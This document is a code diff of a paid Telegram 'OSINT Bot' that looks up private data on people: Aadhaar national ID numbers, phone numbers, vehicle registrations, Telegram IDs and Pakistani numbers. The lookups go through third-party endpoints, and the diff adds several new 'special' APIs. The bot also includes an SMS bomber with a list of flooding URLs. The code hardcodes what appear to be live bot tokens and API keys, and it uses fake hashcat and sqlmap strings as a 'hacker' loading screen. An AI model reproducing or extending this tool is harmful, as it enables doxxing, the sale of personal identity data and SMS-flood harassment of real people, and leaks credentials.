@@ -5,20 +5,25 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 BOT_TOKEN = "8622116851:AAGFGCmwV6ijVGxEpLsVBW7LQbmZvqElmTk"
 ADMIN_ID = 6936978343
 
-# ==================== NUMBER APIs (Both use same) ====================
+# Number API
 NUMBER_API_URL = "https://num-info-redzone.susxbunny.workers.dev/api"
-NUMBER_SPECIAL_URL = "https://num-info-redzone.susxbunny.workers.dev/api"
 NUMBER_API_KEY = "paid_key@REDZONE21"
 
-# ==================== AADHAAR API (NEW) ====================
+# Special APIs (NEW)
+SPECIAL_API_URL = "https://sarkariupdate.online/osint/APIX.php?api=api_b3a91f"
+TG_NUMBER_API_URL = "https://sarkariupdate.online/osint/APIX.php?api=api_6182a6"
+AADHAAR_SPECIAL_API_URL = "https://sarkariupdate.online/osint/APIX.php?api=api_e5ba5c"
+PAKISTAN_API_URL = "https://sarkariupdate.online/osint/APIX.php?api=api_9bfe12"
+
+# Aadhaar API
 AADHAAR_API_URL = "https://rezone-aadhar-info.bunxred5.workers.dev/api"
 AADHAAR_API_KEY = "paid_key_redzone12"
 
-# ==================== VEHICLE APIs ====================
+# Vehicle APIs
 VEHICLE_API_URL = "https://nitin-api-free-user-1k-spacial.vercel.app/api"
 VEHICLE_SPECIAL_API_URL = "https://reseller-host.vercel.app/api/rc"
 
-# ==================== SMS BOMBER URLs ====================
+# SMS Bomber URLs
 BOMBER_URLS = [
     'https://getofferpro.xyz/bomber/index.php',
     'https://getofferpro.xyz/bomber2/index.php',
@@ -34,7 +39,6 @@ BOMBER_URLS = [
 ]
 
 OWNER = "@Cyber_With_Ranjan"
-INSTA = "https://www.instagram.com/ranjan_bhai_194?igsh=ZTM2enVsNmt3MnJv"
 WEBSITE = "https://cyberwithranjan.in"
 GROUP = "https://t.me/cyberwithranjan"
 CHANNEL = "https://t.me/cyberwithranjan"
@@ -64,12 +68,12 @@ BOMBER_STATE = {}
 
 # ==================== LANGUAGES ====================
 L = {
-    'en': {'lang': "🌐 **Select Language:**", 'welcome': "🎁 **Welcome to OSINT Bot!**\n\n🪙 **FREE Daily Coin**\n• Claim 1 coin every day for FREE\n• 1 Coin = 1 Search\n\n💎 **Premium Plans**\n• 1 Day – ₹10\n• 1 Week – ₹60\n• 1 Month – ₹101\n\n📸 Scan QR below to buy premium\n👇 Or claim your FREE coin now!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 Buy Premium", 'already_claimed': "✅ Aaj ka coin already claim kar chuke ho!\n\n⏰ Kal phir aana", 'coin_claimed': "🎉 **Congratulations!**\n\n🪙 You got 1 FREE Coin!\n🪙 Total Coins: {coins}\n\n✅ Now you can search any info!", 'main_menu': "📱 **Main Menu**", 'search': "🔍 Search", 'premium': "💎 Premium", 'number': "📱 Number", 'vehicle': "🚗 Vehicle", 'vehicle_special': "🚘 Vehicle Special", 'aadhaar': "🆔 Aadhaar", 'profile_btn': "👤 Profile", 'help_btn': "❓ Help", 'about_btn': "ℹ️ About", 'clear_btn': "🗑️ Clear", 'back': "🔙 Back", 'owner': "👨‍💻 Owner", 'admin_only': "⚠️ Not authorized.", 'enter_number': "📱 Send 10-digit number:", 'enter_vehicle': "🚗 Send vehicle number:", 'enter_vehicle_special': "🚘 Send vehicle for Special:", 'enter_aadhaar': "🆔 Send 12-digit Aadhaar:", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **Profile**\n\n🆔 ID: `{uid}`\n🪙 Coins: **{coins}**\n💎 Premium: {prem}\n🔍 Searches: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ No coins! Claim daily 1 FREE coin.", 'stats_text': "📊 Stats\n👥 Total: {total}\n💎 Premium: {premium}\n🪙 Coins: {coins}\n🔍 Searches: {searches}"},
-    'hi': {'lang': "🌐 **भाषा चुनें:**", 'welcome': "🎁 **OSINT Bot में स्वागत है!**\n\n🪙 **FREE Daily Coin**\n• रोज 1 FREE Coin claim करें\n• 1 Coin = 1 Search\n\n💎 **प्रीमियम प्लान**\n• 1 दिन – ₹10\n• 1 सप्ताह – ₹60\n• 1 महीना – ₹101\n\n📸 QR स्कैन करके premium खरीदें\n👇 या अभी FREE coin claim करें!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 प्रीमियम खरीदें", 'already_claimed': "✅ आज का coin already claim कर चुके हो!\n\n⏰ कल फिर आना", 'coin_claimed': "🎉 **बधाई हो!**\n\n🪙 आपको 1 FREE Coin मिला!\n🪙 Total Coins: {coins}\n\n✅ अब आप कोई भी info search कर सकते हैं!", 'main_menu': "📱 **मुख्य मेनू**", 'search': "🔍 खोज", 'premium': "💎 प्रीमियम", 'number': "📱 नंबर", 'vehicle': "🚗 वाहन", 'vehicle_special': "🚘 वाहन Special", 'aadhaar': "🆔 आधार", 'profile_btn': "👤 प्रोफाइल", 'help_btn': "❓ मदद", 'about_btn': "ℹ️ जानकारी", 'clear_btn': "🗑️ साफ करें", 'back': "🔙 वापस", 'owner': "👨‍💻 मालिक", 'admin_only': "⚠️ अधिकृत नहीं।", 'enter_number': "📱 10 अंकों का नंबर भेजें:", 'enter_vehicle': "🚗 वाहन नंबर भेजें:", 'enter_vehicle_special': "🚘 Special वाहन:", 'enter_aadhaar': "🆔 12 अंकों का आधार:", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **प्रोफाइल**\n\n🆔 ID: `{uid}`\n🪙 Coins: **{coins}**\n💎 प्रीमियम: {prem}\n🔍 खोज: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin नहीं! रोज 1 FREE coin claim करें।", 'stats_text': "📊 आँकड़े\n👥 कुल: {total}\n💎 प्रीमियम: {premium}\n🪙 Coins: {coins}\n🔍 खोज: {searches}"},
-    'bn': {'lang': "🌐 **ভাষা নির্বাচন করুন:**", 'welcome': "🎁 **OSINT Bot এ স্বাগতম!**\n\n🪙 **FREE Daily Coin**\n• প্রতিদিন ১টি FREE Coin\n• ১ Coin = ১ Search\n\n💎 **প্রিমিয়াম প্ল্যান**\n• ১ দিন – ₹১০\n• ১ সপ্তাহ – ₹৬০\n• ১ মাস – ₹১০১\n\n📸 QR স্ক্যান করুন\n👇 অথবা FREE coin claim করুন!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 প্রিমিয়াম কিনুন", 'already_claimed': "✅ আজকের coin ইতিমধ্যে claim করেছেন!\n\n⏰ কাল আবার আসুন", 'coin_claimed': "🎉 **অভিনন্দন!**\n\n🪙 ১টি FREE Coin পেয়েছেন!\n🪙 Total Coins: {coins}\n\n✅ এখন যেকোনো info search করুন!", 'main_menu': "📱 **মেনু**", 'search': "🔍 অনুসন্ধান", 'premium': "💎 প্রিমিয়াম", 'number': "📱 নম্বর", 'vehicle': "🚗 গাড়ি", 'vehicle_special': "🚘 গাড়ি স্পেশাল", 'aadhaar': "🆔 আধার", 'profile_btn': "👤 প্রোফাইল", 'help_btn': "❓ সাহায্য", 'about_btn': "ℹ️ তথ্য", 'clear_btn': "🗑️ মুছুন", 'back': "🔙 ফিরে", 'owner': "👨‍💻 মালিক", 'admin_only': "⚠️ অনুমতি নেই।", 'enter_number': "📱 ১০ অঙ্কের নম্বর:", 'enter_vehicle': "🚗 গাড়ির নম্বর:", 'enter_vehicle_special': "🚘 স্পেশাল গাড়ি:", 'enter_aadhaar': "🆔 ১২ অঙ্কের আধার:", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **প্রোফাইল**\n\n🆔 ID: `{uid}`\n🪙 Coins: **{coins}**\n💎 প্রিমিয়াম: {prem}\n🔍 অনুসন্ধান: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin নেই! দৈনিক ১ FREE coin নিন।", 'stats_text': "📊 পরিসংখ্যান\n👥 মোট: {total}\n💎 প্রিমিয়াম: {premium}\n🪙 Coins: {coins}\n🔍 অনুসন্ধান: {searches}"},
-    'mr': {'lang': "🌐 **भाषा निवडा:**", 'welcome': "🎁 **OSINT Bot मध्ये स्वागत!**\n\n🪙 **FREE Daily Coin**\n• रोज १ FREE Coin\n• १ Coin = १ Search\n\n💎 **प्रीमियम प्लान**\n• १ दिवस – ₹१०\n• १ आठवडा – ₹६०\n• १ महिना – ₹१०१\n\n📸 QR स्कॅन करा\n👇 किंवा FREE coin claim करा!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 प्रीमियम खरेदी", 'already_claimed': "✅ आजचा coin आधीच claim केला!\n\n⏰ उद्या पुन्हा या", 'coin_claimed': "🎉 **अभिनंदन!**\n\n🪙 १ FREE Coin मिळाला!\n🪙 Total Coins: {coins}\n\n✅ आता कोणतीही info शोधा!", 'main_menu': "📱 **मुख्य मेनू**", 'search': "🔍 शोध", 'premium': "💎 प्रीमियम", 'number': "📱 क्रमांक", 'vehicle': "🚗 वाहन", 'vehicle_special': "🚘 वाहन स्पेशल", 'aadhaar': "🆔 आधार", 'profile_btn': "👤 प्रोफाइल", 'help_btn': "❓ मदत", 'about_btn': "ℹ️ माहिती", 'clear_btn': "🗑️ साफ करा", 'back': "🔙 मागे", 'owner': "👨‍💻 मालक", 'admin_only': "⚠️ अधिकार नाही.", 'enter_number': "📱 १० अंकी क्रमांक:", 'enter_vehicle': "🚗 वाहन क्रमांक:", 'enter_vehicle_special': "🚘 स्पेशल वाहन:", 'enter_aadhaar': "🆔 १२ अंकी आधार:", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **प्रोफाइल**\n\n🆔 ID: `{uid}`\n🪙 Coins: **{coins}**\n💎 प्रीमियम: {prem}\n🔍 शोध: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin नाही! रोज १ FREE coin.", 'stats_text': "📊 आकडेवारी\n👥 एकूण: {total}\n💎 प्रीमियम: {premium}\n🪙 Coins: {coins}\n🔍 शोध: {searches}"},
-    'ur': {'lang': "🌐 **زبان منتخب کریں:**", 'welcome': "🎁 **OSINT Bot میں خوش آمدید!**\n\n🪙 **FREE Daily Coin**\n• روزانہ ۱ FREE Coin\n• ۱ Coin = ۱ Search\n\n💎 **پریمیم پلان**\n• ۱ دن – ₹۱۰\n• ۱ ہفتہ – ₹۶۰\n• ۱ مہینہ – ₹۱۰۱\n\n📸 QR اسکین کریں\n👇 یا FREE coin claim کریں!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 پریمیم خریدیں", 'already_claimed': "✅ آج کا coin پہلے claim کر چکے!\n\n⏰ کل پھر آئیں", 'coin_claimed': "🎉 **مبارک ہو!**\n\n🪙 ۱ FREE Coin ملا!\n🪙 Total Coins: {coins}\n\n✅ اب کوئی بھی info search کریں!", 'main_menu': "📱 **مین مینو**", 'search': "🔍 تلاش", 'premium': "💎 پریمیم", 'number': "📱 نمبر", 'vehicle': "🚗 گاڑی", 'vehicle_special': "🚘 گاڑی سپیشل", 'aadhaar': "🆔 آدھار", 'profile_btn': "👤 پروفائل", 'help_btn': "❓ مدد", 'about_btn': "ℹ️ معلومات", 'clear_btn': "🗑️ صاف", 'back': "🔙 واپس", 'owner': "👨‍💻 مالک", 'admin_only': "⚠️ مجاز نہیں۔", 'enter_number': "📱 ۱۰ ہندسی نمبر:", 'enter_vehicle': "🚗 گاڑی نمبر:", 'enter_vehicle_special': "🚘 سپیشل گاڑی:", 'enter_aadhaar': "🆔 ۱۲ ہندسی آدھار:", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **پروفائل**\n\n🆔 ID: `{uid}`\n🪙 Coins: **{coins}**\n💎 پریمیم: {prem}\n🔍 تلاش: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin نہیں! روزانہ ۱ FREE coin لیں۔", 'stats_text': "📊 اعداد\n👥 کل: {total}\n💎 پریمیم: {premium}\n🪙 Coins: {coins}\n🔍 تلاش: {searches}"},
-    'ta': {'lang': "🌐 **மொழியைத் தேர்ந்தெடுக்கவும்:**", 'welcome': "🎁 **OSINT Bot க்கு வரவேற்கிறோம்!**\n\n🪙 **FREE Daily Coin**\n• தினமும் 1 FREE Coin\n• 1 Coin = 1 Search\n\n💎 **பிரீமியம் திட்டம்**\n• 1 நாள் – ₹10\n• 1 வாரம் – ₹60\n• 1 மாதம் – ₹101\n\n📸 QR ஸ்கேன் செய்யவும்\n👇 அல்லது FREE coin claim செய்யுங்கள்!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 பிரீமியம் வாங்க", 'already_claimed': "✅ இன்றைய coin ஏற்கனவே claim! \n\n⏰ நாளை மீண்டும் வாருங்கள்", 'coin_claimed': "🎉 **வாழ்த்துக்கள்!**\n\n🪙 1 FREE Coin கிடைத்தது!\n🪙 Total Coins: {coins}\n\n✅ இப்போது எந்த info search செய்யுங்கள்!", 'main_menu': "📱 **மெனு**", 'search': "🔍 தேடு", 'premium': "💎 பிரீமியம்", 'number': "📱 எண்", 'vehicle': "🚗 வாகனம்", 'vehicle_special': "🚘 வாகனம் ஸ்பெஷல்", 'aadhaar': "🆔 ஆதார்", 'profile_btn': "👤 சுயவிவரம்", 'help_btn': "❓ உதவி", 'about_btn': "ℹ️ தகவல்", 'clear_btn': "🗑️ அழி", 'back': "🔙 பின்", 'owner': "👨‍💻 உரிமை", 'admin_only': "⚠️ அனுமதி இல்லை.", 'enter_number': "📱 10 இலக்க எண்:", 'enter_vehicle': "🚗 வாகன எண்:", 'enter_vehicle_special': "🚘 ஸ்பெஷல் வாகனம்:", 'enter_aadhaar': "🆔 12 இலக்க ஆதார்:", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **சுயவிவரம்**\n\n🆔 ID: `{uid}`\n🪙 Coins: **{coins}**\n💎 பிரீமியம்: {prem}\n🔍 தேடல்: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin இல்லை! தினமும் 1 FREE coin.", 'stats_text': "📊 புள்ளி\n👥 மொத்தம்: {total}\n💎 பிரீமியம்: {premium}\n🪙 Coins: {coins}\n🔍 தேடல்: {searches}"}
+    'en': {'lang': "🌐 **Select Language:**", 'welcome': "🎁 **Welcome to OSINT Bot!**\n\n🪙 **FREE Daily Coin**\n• Claim 1 coin every day\n• 1 Coin = 1 Search\n\n💎 **Premium Plans**\n• 1 Day – ₹10\n• 1 Week – ₹60\n• 1 Month – ₹101\n\n📸 Scan QR to buy premium\n👇 Or claim FREE coin now!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 Buy Premium", 'already_claimed': "✅ Aaj ka coin already claim kar chuke ho!\n\n⏰ Kal phir aana", 'coin_claimed': "🎉 **Congratulations!**\n\n🪙 You got 1 FREE Coin!\n🪙 Total Coins: {coins}\n\n✅ Now you can search!", 'main_menu': "📱 **Main Menu**", 'search': "🔍 Search", 'premium': "💎 Premium", 'number': "📱 Number", 'vehicle': "🚗 Vehicle", 'vehicle_special': "🚘 Vehicle Spl", 'aadhaar': "🆔 Aadhaar", 'profile_btn': "👤 Profile", 'help_btn': "❓ Help", 'about_btn': "ℹ️ About", 'clear_btn': "🗑️ Clear", 'back': "🔙 Back", 'owner': "👨‍💻 Owner", 'admin_only': "⚠️ Not authorized.", 'enter_number': "📱 Send 10-digit number:", 'enter_vehicle': "🚗 Send vehicle number:", 'enter_vehicle_special': "🚘 Send vehicle for Special:", 'enter_aadhaar': "🆔 Send 12-digit Aadhaar:", 'enter_special': "🔍 Send number for Special lookup:", 'enter_aadhaar_special': "🆔 Send 12-digit Aadhaar for Special:", 'enter_tg_number': "📞 Send Telegram ID:", 'enter_pakistan': "🇵🇰 Send Pakistan number (03XXXXXXXXX):", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **Profile**\n\n🆔 ID: `{uid}`\n🪙 Coins: **{coins}**\n💎 Premium: {prem}\n🔍 Searches: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ No coins! Claim daily 1 FREE coin.", 'stats_text': "📊 Stats\n👥 Total: {total}\n💎 Premium: {premium}\n🪙 Coins: {coins}\n🔍 Searches: {searches}"},
+    'hi': {'lang': "🌐 **भाषा चुनें:**", 'welcome': "🎁 **OSINT Bot में स्वागत!**\n\n🪙 **FREE Daily Coin**\n• रोज 1 FREE Coin claim करें\n• 1 Coin = 1 Search\n\n💎 **प्रीमियम प्लान**\n• 1 दिन – ₹10\n• 1 सप्ताह – ₹60\n• 1 महीना – ₹101\n\n📸 QR स्कैन करके premium खरीदें\n👇 या अभी FREE coin claim करें!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 प्रीमियम खरीदें", 'already_claimed': "✅ आज का coin already claim कर चुके हो!\n\n⏰ कल फिर आना", 'coin_claimed': "🎉 **बधाई हो!**\n\n🪙 आपको 1 FREE Coin मिला!\n🪙 Total Coins: {coins}\n\n✅ अब search कर सकते हैं!", 'main_menu': "📱 **मुख्य मेनू**", 'search': "🔍 खोज", 'premium': "💎 प्रीमियम", 'number': "📱 नंबर", 'vehicle': "🚗 वाहन", 'vehicle_special': "🚘 वाहन Spl", 'aadhaar': "🆔 आधार", 'profile_btn': "👤 प्रोफाइल", 'help_btn': "❓ मदद", 'about_btn': "ℹ️ जानकारी", 'clear_btn': "🗑️ साफ करें", 'back': "🔙 वापस", 'owner': "👨‍💻 मालिक", 'admin_only': "⚠️ अधिकृत नहीं।", 'enter_number': "📱 10 अंकों का नंबर भेजें:", 'enter_vehicle': "🚗 वाहन नंबर भेजें:", 'enter_vehicle_special': "🚘 Special वाहन:", 'enter_aadhaar': "🆔 12 अंकों का आधार:", 'enter_special': "🔍 Special के लिए number भेजें:", 'enter_aadhaar_special': "🆔 12-digit Aadhaar for Special:", 'enter_tg_number': "📞 Telegram ID भेजें:", 'enter_pakistan': "🇵🇰 Pakistan number (03XXXXXXXXX):", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **प्रोफाइल**\n\n🆔 ID: `{uid}`\n🪙 Coins: **{coins}**\n💎 प्रीमियम: {prem}\n🔍 खोज: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin नहीं! रोज 1 FREE coin claim करें।", 'stats_text': "📊 आँकड़े\n👥 कुल: {total}\n💎 प्रीमियम: {premium}\n🪙 Coins: {coins}\n🔍 खोज: {searches}"},
+    'bn': {'lang': "🌐 **ভাষা নির্বাচন:**", 'welcome': "🎁 **OSINT Bot এ স্বাগতম!**\n\n🪙 **FREE Daily Coin**\n• প্রতিদিন ১টি FREE Coin\n• ১ Coin = ১ Search\n\n💎 **প্রিমিয়াম প্ল্যান**\n• ১ দিন – ₹১০\n• ১ সপ্তাহ – ₹৬০\n• ১ মাস – ₹১০১\n\n📸 QR স্ক্যান করুন\n👇 অথবা FREE coin claim করুন!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 প্রিমিয়াম কিনুন", 'already_claimed': "✅ আজকের coin claim হয়েছেন!\n\n⏰ কাল আবার আসুন", 'coin_claimed': "🎉 **অভিনন্দন!**\n\n🪙 ১টি FREE Coin পেয়েছেন!\n🪙 Total: {coins}\n\n✅ এখন search করুন!", 'main_menu': "📱 **মেনু**", 'search': "🔍 অনুসন্ধান", 'premium': "💎 প্রিমিয়াম", 'number': "📱 নম্বর", 'vehicle': "🚗 গাড়ি", 'vehicle_special': "🚘 গাড়ি Spl", 'aadhaar': "🆔 আধার", 'profile_btn': "👤 প্রোফাইল", 'help_btn': "❓ সাহায্য", 'about_btn': "ℹ️ তথ্য", 'clear_btn': "🗑️ মুছুন", 'back': "🔙 ফিরে", 'owner': "👨‍💻 মালিক", 'admin_only': "⚠️ অনুমতি নেই।", 'enter_number': "📱 ১০ অঙ্কের নম্বর:", 'enter_vehicle': "🚗 গাড়ির নম্বর:", 'enter_vehicle_special': "🚘 স্পেশাল গাড়ি:", 'enter_aadhaar': "🆔 ১২ অঙ্কের আধার:", 'enter_special': "🔍 Special নম্বর:", 'enter_aadhaar_special': "🆔 ১২ অঙ্কের আধার Special:", 'enter_tg_number': "📞 Telegram ID:", 'enter_pakistan': "🇵🇰 Pakistan number (03XXXXXXXXX):", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **প্রোফাইল**\n\n🆔 `{uid}`\n🪙 Coins: **{coins}**\n💎 প্রিমিয়াম: {prem}\n🔍 অনুসন্ধান: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin নেই! দৈনিক ১ FREE coin নিন।", 'stats_text': "📊 পরিসংখ্যান\n👥 মোট: {total}\n💎 প্রিমিয়াম: {premium}\n🪙 Coins: {coins}\n🔍 অনুসন্ধান: {searches}"},
+    'mr': {'lang': "🌐 **भाषा निवडा:**", 'welcome': "🎁 **OSINT Bot मध्ये स्वागत!**\n\n🪙 **FREE Daily Coin**\n• रोज १ FREE Coin\n• १ Coin = १ Search\n\n💎 **प्रीमियम प्लान**\n• १ दिवस – ₹१०\n• १ आठवडा – ₹६०\n• १ महिना – ₹१०१\n\n📸 QR स्कॅन करा\n👇 किंवा FREE coin claim करा!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 प्रीमियम खरेदी", 'already_claimed': "✅ आजचा coin claim केला!\n\n⏰ उद्या या", 'coin_claimed': "🎉 **अभिनंदन!**\n\n🪙 १ FREE Coin मिळाला!\n🪙 Total: {coins}\n\n✅ आता search करा!", 'main_menu': "📱 **मुख्य मेनू**", 'search': "🔍 शोध", 'premium': "💎 प्रीमियम", 'number': "📱 क्रमांक", 'vehicle': "🚗 वाहन", 'vehicle_special': "🚘 वाहन Spl", 'aadhaar': "🆔 आधार", 'profile_btn': "👤 प्रोफाइल", 'help_btn': "❓ मदत", 'about_btn': "ℹ️ माहिती", 'clear_btn': "🗑️ साफ करा", 'back': "🔙 मागे", 'owner': "👨‍💻 मालक", 'admin_only': "⚠️ अधिकार नाही.", 'enter_number': "📱 १० अंकी क्रमांक:", 'enter_vehicle': "🚗 वाहन क्रमांक:", 'enter_vehicle_special': "🚘 स्पेशल वाहन:", 'enter_aadhaar': "🆔 १२ अंकी आधार:", 'enter_special': "🔍 Special क्रमांक:", 'enter_aadhaar_special': "🆔 १२ अंकी आधार Special:", 'enter_tg_number': "📞 Telegram ID:", 'enter_pakistan': "🇵🇰 Pakistan number (03XXXXXXXXX):", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **प्रोफाइल**\n\n🆔 `{uid}`\n🪙 Coins: **{coins}**\n💎 प्रीमियम: {prem}\n🔍 शोध: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin नाही! रोज १ FREE coin.", 'stats_text': "📊 आकडेवारी\n👥 एकूण: {total}\n💎 प्रीमियम: {premium}\n🪙 Coins: {coins}\n🔍 शोध: {searches}"},
+    'ur': {'lang': "🌐 **زبان منتخب:**", 'welcome': "🎁 **OSINT Bot میں خوش آمدید!**\n\n🪙 **FREE Daily Coin**\n• روزانہ ۱ FREE Coin\n• ۱ Coin = ۱ Search\n\n💎 **پریمیم پلان**\n• ۱ دن – ₹۱۰\n• ۱ ہفتہ – ₹۶۰\n• ۱ مہینہ – ₹۱۰۱\n\n📸 QR اسکین کریں\n👇 یا FREE coin claim کریں!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 پریمیم خریدیں", 'already_claimed': "✅ آج کا coin claim کر چکے!\n\n⏰ کل آئیں", 'coin_claimed': "🎉 **مبارک ہو!**\n\n🪙 ۱ FREE Coin ملا!\n🪙 Total: {coins}\n\n✅ اب search کریں!", 'main_menu': "📱 **مین مینو**", 'search': "🔍 تلاش", 'premium': "💎 پریمیم", 'number': "📱 نمبر", 'vehicle': "🚗 گاڑی", 'vehicle_special': "🚘 گاڑی Spl", 'aadhaar': "🆔 آدھار", 'profile_btn': "👤 پروفائل", 'help_btn': "❓ مدد", 'about_btn': "ℹ️ معلومات", 'clear_btn': "🗑️ صاف", 'back': "🔙 واپس", 'owner': "👨‍💻 مالک", 'admin_only': "⚠️ مجاز نہیں۔", 'enter_number': "📱 ۱۰ ہندسی نمبر:", 'enter_vehicle': "🚗 گاڑی نمبر:", 'enter_vehicle_special': "🚘 سپیشل گاڑی:", 'enter_aadhaar': "🆔 ۱۲ ہندسی آدھار:", 'enter_special': "🔍 Special نمبر:", 'enter_aadhaar_special': "🆔 ۱۲ ہندسی آدھار Special:", 'enter_tg_number': "📞 Telegram ID:", 'enter_pakistan': "🇵🇰 Pakistan number (03XXXXXXXXX):", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **پروفائل**\n\n🆔 `{uid}`\n🪙 Coins: **{coins}**\n💎 پریمیم: {prem}\n🔍 تلاش: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin نہیں! روزانہ ۱ FREE coin.", 'stats_text': "📊 اعداد\n👥 کل: {total}\n💎 پریمیم: {premium}\n🪙 Coins: {coins}\n🔍 تلاش: {searches}"},
+    'ta': {'lang': "🌐 **மொழி தேர்வு:**", 'welcome': "🎁 **OSINT Bot க்கு வரவேற்கிறோம்!**\n\n🪙 **FREE Daily Coin**\n• தினமும் 1 FREE Coin\n• 1 Coin = 1 Search\n\n💎 **பிரீமியம் திட்டம்**\n• 1 நாள் – ₹10\n• 1 வாரம் – ₹60\n• 1 மாதம் – ₹101\n\n📸 QR ஸ்கேன் செய்யவும்\n👇 அல்லது FREE coin claim!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 பிரீமியம் வாங்க", 'already_claimed': "✅ இன்றைய coin claim!\n\n⏰ நாளை வாருங்கள்", 'coin_claimed': "🎉 **வாழ்த்துக்கள்!**\n\n🪙 1 FREE Coin!\n🪙 Total: {coins}\n\n✅ Search செய்யுங்கள்!", 'main_menu': "📱 **மெனு**", 'search': "🔍 தேடு", 'premium': "💎 பிரீமியம்", 'number': "📱 எண்", 'vehicle': "🚗 வாகனம்", 'vehicle_special': "🚘 வாகனம் Spl", 'aadhaar': "🆔 ஆதார்", 'profile_btn': "👤 சுயவிவரம்", 'help_btn': "❓ உதவி", 'about_btn': "ℹ️ தகவல்", 'clear_btn': "🗑️ அழி", 'back': "🔙 பின்", 'owner': "👨‍💻 உரிமை", 'admin_only': "⚠️ அனுமதி இல்லை.", 'enter_number': "📱 10 இலக்க எண்:", 'enter_vehicle': "🚗 வாகன எண்:", 'enter_vehicle_special': "🚘 ஸ்பெஷல் வாகனம்:", 'enter_aadhaar': "🆔 12 இலக்க ஆதார்:", 'enter_special': "🔍 Special எண்:", 'enter_aadhaar_special': "🆔 12 இலக்க ஆதார் Special:", 'enter_tg_number': "📞 Telegram ID:", 'enter_pakistan': "🇵🇰 Pakistan number (03XXXXXXXXX):", 'help': "📖 /start /menu /num /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **சுயவிவரம்**\n\n🆔 `{uid}`\n🪙 Coins: **{coins}**\n💎 பிரீமியம்: {prem}\n🔍 தேடல்: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin இல்லை! தினமும் 1 FREE coin.", 'stats_text': "📊 புள்ளி\n👥 மொத்தம்: {total}\n💎 பிரீமியம்: {premium}\n🪙 Coins: {coins}\n🔍 தேடல்: {searches}"}
 }
 
 # ==================== HELPERS ====================
@@ -158,14 +162,13 @@ def get_total_searches():
         return r[0] if r and r[0] else 0
     except: return 0
 
-# ==================== FAST HACKER LOADING (5 steps × 0.2s = 1 sec) ====================
+# ==================== FAST HACKER LOADING ====================
 def hacker_loading(chat_id, msg_id, query, search_type='NUMBER'):
     frames = [
-        (20, "⚡", "SYSTEM BOOT",       "boot --kernel=dark"),
-        (40, "🔐", "HASH CRACKING",     "hashcat -m 0 -a 3"),
-        (60, "💾", "DATABASE ACCESS",   "sqlmap --dump --root"),
-        (80, "🎯", "IDENTITY MATCH",    "facematch --deep --ai"),
-        (100, "✅", "ACCESS GRANTED",   "root@hacker:~$ SUCCESS")
+        (25, "⚡", "SYSTEM BOOT",     "boot --kernel=dark"),
+        (50, "🔐", "HASH CRACKING",   "hashcat -m 0 -a 3"),
+        (75, "💾", "DATABASE ACCESS", "sqlmap --dump --root"),
